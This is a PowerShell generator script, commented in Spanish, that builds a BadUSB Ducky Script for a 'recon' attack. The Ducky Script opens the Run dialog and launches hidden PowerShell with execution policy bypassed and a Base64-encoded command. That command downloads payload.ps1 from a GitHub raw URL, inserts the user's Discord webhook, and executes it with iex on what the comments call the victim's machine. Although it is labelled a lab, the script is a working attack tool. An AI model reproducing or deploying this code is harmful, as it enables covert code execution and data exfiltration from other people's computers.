# ============================================================
# BadUSB Recon - Generador de Ducky Script (metodo download)
# ------------------------------------------------------------
# Descarga el payload desde GitHub raw y le inyecta el webhook
# en memoria antes de ejecutarlo. NO codifica a Base64.
#
# Uso:
#   .\generate_ducky.ps1
#   .\generate_ducky.ps1 -Webhook "https://discord.com/..."
#   .\generate_ducky.ps1 -PayloadUrl "https://raw.githubusercontent.com/..."
# ============================================================

param(
    [string]$Webhook,
    [string]$PayloadUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/main/payloads/payload.ps1",
    [string]$OutputPath
)

$ErrorActionPreference = "Stop"

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$repoRoot  = Split-Path -Parent $scriptDir

if (-not $OutputPath) {
    $OutputPath = Join-Path $repoRoot "payload_ducky.txt"
}

# --- 1. Obtener webhook (igual que antes) ---
if (-not $Webhook) {
    $configPath = Join-Path $repoRoot "config.local.ps1"
    if (Test-Path $configPath) {
        . $configPath
        if ($Config.Webhook -and $Config.Webhook -notlike "*XXX*" -and $Config.Webhook -notlike "*PLACEHOLDER*") {
            $Webhook = $Config.Webhook
            Write-Host "[+] Webhook cargado desde config.local.ps1" -ForegroundColor Green
        }
    }
}

if (-not $Webhook) {
    Write-Host ""
    Write-Host "Pega tu webhook de Discord (o deja vacio para cancelar):" -ForegroundColor Yellow
    $Webhook = Read-Host "Webhook"
}

if (-not $Webhook -or $Webhook -notmatch "^https?://") {
    Write-Host "[-] Webhook no valido. Abortando." -ForegroundColor Red
    exit 1
}

# --- 2. Comando de PowerShell que se ejecutara en la victima ---
$cmd = '$w="' + $Webhook + '"; $p=(iwr "' + $PayloadUrl + '" -UseBasicParsing).Content -join "`n"; $p=$p -replace "PLACEHOLDER_WEBHOOK",$w; iex $p'

# --- 3. Codificar el comando a UTF-16LE -> Base64 ---
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64   = [Convert]::ToBase64String($bytes)

# --- 4. Verificacion: decodificar y comprobar ---
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
if ($decoded -ne $cmd) {
    Write-Host "[-] Verificacion fallida del Base64. Abortando." -ForegroundColor Red
    exit 1
}
Write-Host "[+] Verificacion OK del comando codificado." -ForegroundColor Green

# --- 5. Generar el Ducky Script ---
$ducky = @"
REM ============================================================
REM BadUSB Recon Lab - Ducky Script generado automaticamente
REM Fecha: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
REM Metodo: download + inyeccion de webhook (via -EncodedCommand)
REM IMPORTANTE: no subir este archivo al repo (contiene tu webhook)
REM ============================================================

DELAY 1000
GUI r
DELAY 800
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $b64
ENTER
"@

[IO.File]::WriteAllText($OutputPath, $ducky)

# --- 6. Resumen ---
Write-Host ""
Write-Host "=== RESUMEN ===" -ForegroundColor Yellow
Write-Host "  Metodo       : download + inyeccion en runtime (-EncodedCommand)"
Write-Host "  Payload URL  : $PayloadUrl"
Write-Host "  Webhook      : $($Webhook.Substring(0, [Math]::Min(60, $Webhook.Length)))..."
Write-Host "  Comando plain: $($cmd.Length) chars"
Write-Host "  Base64       : $($b64.Length) chars"
Write-Host "  Ducky Script : $OutputPath"
Write-Host "  Longitud     : $($ducky.Length) caracteres"
Write-Host ""
Write-Host "  Recuerda:" -ForegroundColor Yellow
Write-Host "   - El Ducky Script contiene tu webhook (dentro del Base64)."
Write-Host "   - NO lo subas al repo."
Write-Host "   - El payload.ps1 debe estar accesible en la URL indicada."
